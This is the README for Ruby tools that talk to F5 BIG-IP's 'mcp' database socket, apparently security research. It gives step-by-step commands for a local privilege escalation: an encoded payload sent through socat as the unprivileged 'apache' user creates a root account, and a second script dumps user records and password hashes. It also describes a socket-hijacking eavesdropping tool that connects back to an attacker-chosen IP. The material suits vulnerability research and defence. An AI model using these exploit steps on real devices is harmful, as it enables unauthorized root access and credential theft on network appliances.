This isn't really done or ready yet, but I wanted to get the code checked in.

This basically implements F5's database protocol, "mcp", which operates through
a UNIX domain socket. That means that you need a shell on the F5 device before
you can use any of these. You'll typically forward the output from a script
to `/var/run/mcp` using `socat`, then feed the response into `mcp-parser.rb`.
More details below.

A quick summary of the scripts:

* `mcp-getloot.rb` - Generates a message that will dump users and variables
* `mcp-privesc.rb` - Generates a message that will create a user account
* `mcp-parser.rb` - Parses mcp messages that arrive on stdin
* `mcp-mitm.rb` - Eavesdrop mcp messages on a target host (requires passwordless ssh to root to be configured)
* `mcp-builder.rb` - A library for building mcp messages (you don't need to use directly)

# What is mcp?

MCP is a proprietary (AFAICT) database used by F5 BigIP. It's accessed through
`/var/run/mcp`, a UNIX domain socket with 0777 permissions (ie, any user can
access it).

The protocol is TLV-style, which a whole bunch of types (over 41,000). They're
all listed in [mcp-objects.txt](/mcp-objects.txt).

I implemented a parser that you can find in [mcp-parser.rb](/mcp-parser.rb),
and you can find a bunch of different messages in
[mcp-parser-tests.rb](/mcp-parser-tests.rb).

I also created a builder, [mcp-builder.rb](/mcp-builder.rb), although it's not
really designed to be easy to use. We do have a pre-defined function that
creates an MCP packet that creates a root-level user account, which is pretty
cool. You can use `mcp-privesc.rb` to create that packet.

# Building and Sending MCP Messages

To communicate with MCP directly, you'll generally use `socat`. The code in
`mcp-builder.rb` can create packets, though isn't designed to be run directly.
The scripts you'll probably want to use directly are:

* `mcp-getloot.rb` - to get users and configuration settings
* `mcp-privesc.rb` - to add a new root-level account
* `mcp-parser.rb` - to parse the response (on stdin)

To use one of the query scripts, execute it and find a way to send the output
into the UNIX socket on the target. Here's an example where we gzip +
base64-encode the output from `mcp-privesc.rb`:

```
$ ruby ./mcp-privesc.rb blogtest MyFunPW | gzip | base64 -w0
Attempting to create a crypt-sha512 hash of the password
Writing an `mcp` message to stdout that'll create an account: blogtest / $6$vdznqfyc$q9LEJmhlDZK3HQY0L0WuiKfXaKJtQmOY7lIkMS/IxftTmZs.PdlYXxmxjRQ4f529gl13NsqWlZdd/eksunJT01
Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin

H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==
```

Then we can copy and paste it to an ssh session on the target, where it's sent
to the UNIX socket (note that we're doing this as a non-root user as a
demonstration that it's possible):

```
$ whoami
apache

$ echo -ne 'H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==' | base64 -d | gunzip - | socat -t100 - UNIX-CONNECT:/var/run/mcp | gzip | base64 -w0
H4sIAB91UGMAA2NgYJBjQALcIQy8QEqMO5SBFcwPZ+AR0OCOAJKaYAUEVXNHgVRzCzIwAABM8W1YXAAAAA==

bash-4.2$ su blogtest
Password: 
[...]

[blogtest@localhost:NO LICENSE:Standalone] config # whoami
root
```

We can also parse the response we got using `mcp-parser.rb`:

```
$ echo -ne 'H4sIAB91UGMAA2NgYJBjQALcIQy8QEqMO5SBFcwPZ+AR0OCOAJKaYAUEVXNHgVRzCzIwAABM8W1YXAAAAA==' | base64 -d | gunzip - | ruby ./mcp-parser.rb 
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = create
 result_type (tag) = userdb_entry
```

You can, of course, do it all as a single command; here how you can use
`mcp-getloot.rb`:

```
$ ruby ./mcp-getloot.rb | ssh root@10.0.0.162 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb | head -n30
Writing an `mcp` message to stdout that'll query for interesting stuff
Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin

query_reply (structure [949 bytes]):
 userdb_entry (structure [233 bytes]):
  userdb_entry_name (string [6 bytes]) = "root"
  trunk_virtual_mbr_transaction_id (ulong) = 0x00000001 (1)
  userdb_entry_partition_id (string [8 bytes]) = "Common"
  fw_analytics_settings_dns_collect_dst_i... (long) = 0xffffffff (4294967295)
  userdb_entry_is_system (ulong) = 0x00000001 (1)
  userdb_entry_oldpasswd (string [2 bytes]) = ""
  userdb_entry_shell (string [11 bytes]) = "/bin/bash"
  userdb_entry_gecos (string [6 bytes]) = "root"
  userdb_entry_is_crypted (ulong) = 0x00000001 (1)
  userdb_entry_passwd (string [100 bytes]) = "$6$UIHYzBX6$UClrSPt1o/G2meP27zBzRJnAjWEIkhNEQzqDYwn5gtnoKqFeGhnJveUUHGavaPU1FO9eif2pnADjDN/5YgMI3/"
  userdb_entry_description (string [2 bytes]) = ""
  userdb_entry_object_id (ulong) = 0x00002a70 (10864)
 userdb_entry (structure [251 bytes]):
  userdb_entry_name (string [7 bytes]) = "admin"
[...]
db_variable (structure [224 bytes]):
  db_variable_name (string [38 bytes]) = "platform.diskmonitor.freelast.vmdisk"
  db_variable_transaction_id (ulong) = 0x0000004b (75)
  db_variable_scf_config (string [7 bytes]) = "false"
  db_variable_maximum (string [2 bytes]) = ""
  db_variable_minimum (string [2 bytes]) = ""
  db_variable_data_type (string [9 bytes]) = "integer"
  db_variable_sync_type (string [18 bytes]) = "private_internal"
  db_variable_default (string [3 bytes]) = "0"
  db_variable_value (string [3 bytes]) = "0"
  db_variable_display_name (string [38 bytes]) = "Platform.DiskMonitor.FreeLast.vmdisk"
  db_variable_object_id (ulong) = 0x0000e705 (59141)
  db_variable_enumerated (array [6 bytes]): Array data: 000f00000000
```

# Connection Eavesdropping

I also wrote a tool to inspect/log database queries in real time -
[mcp-mitm.rb](/mcp-mitm.rb). This isn't an exploit, it's just an analysis tool
that requires a root login. Effectively, it moves `/var/run/mcp` and replaces
it with a socket that we control, then parses all the messages going through it.

To run it:

* Ensure the server isn't being used for anything important - this is somewhere between "destructive" and "interrupty" because we yoink the database socket (it does try to fix it after!)
* Ensure the F5 Big-IP host can connect back to you on any two ports (1234 and 1235 by default)
* Ensure you can `ssh root@<target>` with no password or other input (or edit the code and turn off `DO_SETUP`)

Pretty much any potential "damage" is fixed with a reboot, since it creates the
socket at boot, but you probably don't wanna do that on prod.

Anyway, execute with no args to get the usage, then fill in the important IP
addresses:

```
$ ruby ./mcp-mitm.rb
Usage: ruby ./mcp-mitm.rb <your ip> <target ip> [listen port 1] [listen port 2]
[...]

$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162

$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162
Configuration (edit the script to change, this is a PoC!):

Your IP: 10.0.0.179
Target IP: 10.0.0.162
Listening port 1: 1234
Listening port 2: 1235
SSH into the target to set things up: true
  (Make sure you can ssh into the host as root with no password)
  (Yes yes, I know it's a PoC!)
SSH'ing into the server to set things up
Ready!
```

If you wait around (or do stuff on the server), you'll see sessions:

```
Received session @ #<TCPSocket:0x000000000170d630> <--> #<TCPSocket:0x000000000170d658>

user_authenticated (structure [15 bytes]):
 user_authenticated_name (string [7 bytes]) = "admin"

start_transaction (structure [8 bytes]):
 start_transaction_load_type (ulong) = 0x00000000 (0)
[...]
```

Ctrl-c will stop it, and fix the socket:

```
^CSSH'ing into the server to fix things
Session 1 closed?
Ending thread
Ending thread
Traceback (most recent call last):
        3: from ./mcp-mitm.rb:149:in `<main>'
        2: from ./mcp-mitm.rb:149:in `loop'
        1: from ./mcp-mitm.rb:151:in `block in <main>'
./mcp-mitm.rb:151:in `accept': Interrupt
```

And that's it!
